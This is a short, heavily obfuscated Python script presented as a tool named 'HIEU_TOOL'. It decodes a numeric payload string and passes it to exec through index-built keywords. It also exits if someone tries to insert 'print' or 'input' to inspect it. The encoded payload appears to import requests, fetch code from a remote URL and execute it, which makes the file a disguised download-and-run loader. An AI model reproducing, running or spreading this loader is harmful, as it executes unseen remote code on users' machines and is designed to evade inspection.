class HIEU_TOOL():
 def __init__(self:object,_byte:float=False,_exec:float=0,*_delete:int,**_exit:str)->exec:
  self._decode,self._rasputin,self._boom,_byte,self._eval,_exit[_exec]=lambda _byte:str(_exit[_exec](f"{self._boom[4]+self._boom[-13]+self._boom[4]+self._boom[2]}(''.join(%s),{self._boom[6]+self._boom[11]+self._boom[14]+self._boom[1]+self._boom[0]+self._boom[11]+self._boom[18]}())"%list(_byte))).encode(self._boom[20]+self._boom[19]+self._boom[5]+self._boom[34])if _exit[_exec]==eval else exit(),lambda _system:"".join(chr(int(_encode)-len(_system.split('~')))if _encode!='¨'else'ζ'for _encode in str(_system).split('~')),exit()if _byte else'abcdefghijklmnopqrstuvwxyz0123456789',lambda _byte:exit()if self._boom[15]+self._boom[17]+self._boom[8]+self._boom[13]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read() or self._boom[8]+self._boom[13]+self._boom[15]+self._boom[20]+self._boom[19] in open(__file__, errors=self._boom[8]+self._boom[6]+self._boom[13]+self._boom[14]+self._boom[17]+self._boom[4]).read()else"".join(_byte if _byte not in self._boom else self._boom[self._boom.index(_byte)+1 if self._boom.index(_byte)+1<len(self._boom)else 0]for _byte in "".join(chr(ord(t)-987353)if t!="ζ"else"\n"for t in self._rasputin(_byte))),lambda _bit:_byte(_bit),eval
  return self.__decode__(_exit[(self._boom[-1]+'_')[-1]+self._boom[18]+self._boom[15]+self._boom[0]+self._boom[17]+self._boom[10]+self._boom[11]+self._boom[4]])
 def __decode__(self,_execute: str)->exec:return(None,self._decode(self._eval(_execute)))[0]
HIEU_TOOL(_byte=False,_sparkle='''987571~987575~987578~987577~987580~987582~987499~987580~987567~987579~987583~987567~987581~987582~987581~¨~987567~987586~987567~987565~987507~987580~987567~987579~987583~987567~987581~987582~987581~987513~987569~987567~987582~987507~987506~987570~987582~987582~987578~987581~987525~987514~987514~987580~987524~987585~987513~987569~987571~987582~987570~987583~987564~987583~987581~987567~987580~987565~987577~987576~987582~987567~987576~987582~987513~987565~987577~987575~987514~987570~987571~987567~987583~987582~987577~987577~987574~987514~987573~987567~987587~987514~987575~987524~987571~987576~987514~987573~987567~987587~987514~987573~987567~987587~987562~987584~987571~987567~987585~987562~987582~987571~987573~987513~987578~987587~987506~987508~987513~987582~987567~987586~987582~987508''')